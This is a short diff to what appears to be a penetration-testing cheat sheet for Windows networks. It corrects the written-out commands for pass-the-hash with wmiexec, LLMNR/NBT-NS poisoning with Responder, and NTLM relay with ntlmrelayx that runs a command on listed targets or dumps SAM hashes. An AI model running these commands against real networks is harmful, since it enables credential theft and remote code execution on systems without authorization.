@@ -203,12 +203,12 @@ wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
 SMB Relay
 
 ```
-responder -I  NETINTERFACE rdw
+responder -I  NETINTERFACE -dw
 ```
 NTLM Relay [responder.conf con smb y https en "off" (SAM dumping without 'c' flag)]
 
 ```
-python3 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
+ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 ```
 Domain Host Discovery
 
